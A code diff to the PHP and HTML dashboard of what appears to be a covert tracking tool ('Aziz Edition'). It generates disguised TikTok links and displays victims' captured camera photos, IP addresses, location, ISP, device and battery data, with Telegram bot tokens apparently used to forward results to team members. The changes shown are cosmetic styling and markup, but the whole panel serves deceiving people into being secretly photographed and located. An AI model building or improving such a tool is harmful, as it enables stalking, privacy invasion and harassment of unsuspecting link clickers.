+        input:focus { border-color: var(--accent); box-shadow: 0 0 10px rgba(139, 92, 246, 0.4); }
         
-        .btn { background: var(--accent); color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn:hover { background: #7c3aed; transform: translateY(-1px); }
+        .btn { 
+            background: linear-gradient(135deg, var(--accent), #6d28d9); 
+            color: white; border: none; padding: 12px 20px; border-radius: 8px; 
+            font-weight: 600; cursor: pointer; transition: 0.3s; font-size: 14px; 
+            display: inline-flex; align-items: center; justify-content: center; gap: 8px; 
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 0 15px rgba(139, 92, 246, 0.6); }
         .btn-block { width: 100%; }
-        .btn-danger { background: rgba(244, 63, 94, 0.1); color: var(--danger); border: 1px solid rgba(244, 63, 94, 0.3); }
-        .btn-danger:hover { background: var(--danger); color: white; }
-        .btn-success { background: var(--success); }
+        .btn-danger { background: linear-gradient(135deg, var(--danger), #be123c); }
+        .btn-danger:hover { box-shadow: 0 0 15px rgba(244, 63, 94, 0.6); }
+        .btn-success { background: linear-gradient(135deg, var(--success), #047857); }
+        .btn-success:hover { box-shadow: 0 0 15px rgba(16, 185, 129, 0.6); }
         
-        /* Stats */
         .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 25px; }
-        .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 15px; text-align: center; }
+        .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 15px; text-align: center; transition: 0.3s; }
+        .stat-card:hover { border-color: var(--accent); box-shadow: 0 0 15px rgba(139, 92, 246, 0.3); }
         .stat-card h3 { font-size: 12px; color: var(--muted); margin-bottom: 10px; }
         .stat-card p { font-size: 26px; font-weight: 800; color: var(--accent); }
         
-        /* Gallery */
         .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
         .capture-card { background: #050b14; border: 1px solid var(--border); border-radius: 12px; overflow: hidden; transition: 0.3s; display: flex; flex-direction: column; }
-        .capture-card:hover { transform: translateY(-3px); border-color: var(--accent); box-shadow: 0 10px 25px rgba(139, 92, 246, 0.2); }
+        .capture-card:hover { transform: translateY(-5px); border-color: var(--accent); box-shadow: 0 10px 25px rgba(139, 92, 246, 0.2); }
         .capture-card img { width: 100%; height: 200px; object-fit: cover; }
         .capture-info { padding: 15px; flex: 1; display: flex; flex-direction: column; }
         .info-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; color: var(--muted); }
         .info-row span { color: var(--text); font-weight: 500; }
         .map-container { height: 150px; width: 100%; border-radius: 8px; margin: 10px 0; border: 1px solid var(--border); }
         
-        /* Table */
         .table-responsive { overflow-x: auto; }
         table { width: 100%; border-collapse: collapse; font-size: 14px; }
         th, td { padding: 12px; text-align: right; border-bottom: 1px solid var(--border); }
         th { color: var(--muted); font-weight: 600; background: rgba(255,255,255,0.02); }
         
-        /* Mobile */
         @media (max-width: 768px) {
             .app-container { flex-direction: column; height: auto; overflow: visible; }
             .sidebar { width: 100%; padding: 10px; flex-direction: row; overflow-x: auto; border-left: none; border-bottom: 1px solid var(--border); align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
@@ -544,11 +647,10 @@ if ($is_logged_in) {
 <?php else: ?>
 
     <div class="app-container">
-        <!-- القائمة الجانبية -->
         <aside class="sidebar">
             <div class="sidebar-header">
                 <h2>Control Panel</h2>
-                <p>Aziz Edition V22</p>
+                <p>Aziz Edition V21</p>
             </div>
             
             <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
@@ -569,31 +671,24 @@ if ($is_logged_in) {
             </div>
         </aside>
 
-        <!-- المحتوى الرئيسي -->
         <main class="main-content">
-            
-            <!-- 1. الصفحة الرئيسية -->
             <div id="tab-home" class="tab-content active">
                 <h2 style="font-size: 20px; margin-bottom: 20px;">مرحباً، <?php echo htmlspecialchars($current_username); ?> 👋</h2>
 
-                <!-- الإحصائيات -->
                 <div class="stats-grid">
                     <div class="stat-card"><h3>روابطي</h3><p><?php echo $total_links; ?></p></div>
                     <div class="stat-card"><h3>إجمالي الزيارات</h3><p style="color: #38bdf8; text-shadow: 0 0 10px #38bdf8;"><?php echo $total_captures; ?></p></div>
                     <div class="stat-card"><h3>زيارات اليوم</h3><p style="color: var(--success); text-shadow: 0 0 10px var(--success);"><?php echo $today_captures; ?></p></div>
                 </div>
 
-                <!-- إنشاء رابط -->
                 <div class="card" style="border-color: var(--accent);">
                     <div class="card-title">🔗 إنشاء رابط تيك توك جديد</div>
                     <form method="POST">
                         <div class="form-group">
-                            <label>اسم الرابط</label>
-                            <input type="text" name="link_name" required>
+                            <input type="text" name="link_name" placeholder="اسم الحساب" required>
                         </div>
                         <div class="form-group">
-                            <label>رابط فيديو تيك توك</label>
-                            <input type="text" name="target_url" required>
+                            <input type="text" name="target_url" placeholder="ضع رابط فيديو تيك توك هنا..." required>
                         </div>
                         <div class="form-group" style="display: flex; align-items: center; gap: 10px;">
                             <input type="checkbox" name="use_camera" value="1" checked style="width: 18px; height: 18px; accent-color: var(--accent);">
@@ -622,7 +717,6 @@ if ($is_logged_in) {
                     <?php endif; ?>
                 </div>
 
-                <!-- السجلات -->
                 <div class="card">
                     <div class="card-title" style="display: flex; justify-content: space-between;">
                         <span>📸 سجلات الزيارات (<?php echo $is_admin ? 'الجميع' : 'روابطك فقط'; ?>)</span>
@@ -640,9 +734,8 @@ if ($is_logged_in) {
                         <div class="gallery-grid">
                             <?php foreach ($captures as $cap): ?>
                                 <div class="capture-card">
-                                    <!-- اسم الرابط -->
                                     <div style="background: rgba(139, 92, 246, 0.2); padding: 10px; font-weight: bold; color: var(--accent); text-align: center; border-bottom: 1px solid var(--border);">
-                                        📌 <?php echo htmlspecialchars($cap['link_name'] ?? 'رابط بدون اسم'); ?>
+                                        📌 <?php echo htmlspecialchars($cap['link_name'] ?? 'حساب بدون اسم'); ?>
                                     </div>
 
                                     <?php if (!empty($cap['image_data'])): ?>
@@ -667,7 +760,7 @@ if ($is_logged_in) {
                                         <div class="info-row"><span>IP:</span> <span><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
                                         <div class="info-row"><span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span></div>
                                         <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
-                                        <div class="info-row"><span>ISP:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
+                                        <div class="info-row"><span>ISP:</span> <span style="color:#f97316; font-weight: bold; text-shadow: 0 0 5px rgba(249,115,22,0.5);"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
                                         <div class="info-row"><span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span></div>
                                         <div class="info-row"><span>Device:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
                                         <div class="info-row"><span>Battery:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['battery_info']); ?></span></div>
@@ -683,7 +776,6 @@ if ($is_logged_in) {
                 </div>
             </div>
 
-            <!-- 2. إدارة الفريق -->
             <?php if ($is_admin): ?>
             <div id="tab-team" class="tab-content">
                 <div class="card">
@@ -692,7 +784,6 @@ if ($is_logged_in) {
                         <div class="form-group"><input type="text" name="new_username" placeholder="اسم المستخدم" required></div>
                         <div class="form-group"><input type="password" name="new_password" placeholder="كلمة المرور" required></div>
                         <div class="form-group"><input type="text" name="new_tg_chat" placeholder="Chat ID التلجرام"></div>
-                        <!-- توكن تلجرام للزميل -->
                         <div class="form-group"><input type="text" name="new_tg_token" placeholder="توكن البوت (Bot Token)"></div>
                         <div class="form-group"><button type="submit" name="add_user" class="btn btn-success" style="width: 100%; height: 100%;">إضافة</button></div>
                     </form>
@@ -739,7 +830,6 @@ if ($is_logged_in) {
             </div>
             <?php endif; ?>
 
-            <!-- 3. الإعدادات -->
             <div id="tab-settings" class="tab-content">
                 <div class="card" style="max-width: 600px; margin: 0 auto;">
                     <div class="card-title">🔐 تغيير كلمة المرور</div>
@@ -788,7 +878,6 @@ if ($is_logged_in) {
 </footer>
 
 <script>
-    // التبديل بين التبويبات
     function switchTab(tabId) {
         document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
         document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
@@ -797,7 +886,6 @@ if ($is_logged_in) {
         event.currentTarget.classList.add('active');
     }
 
-    // نسخ النصوص
     function copyText(text, btn) {
         navigator.clipboard.writeText(text).then(() => {
             const t = document.getElementById('toast');
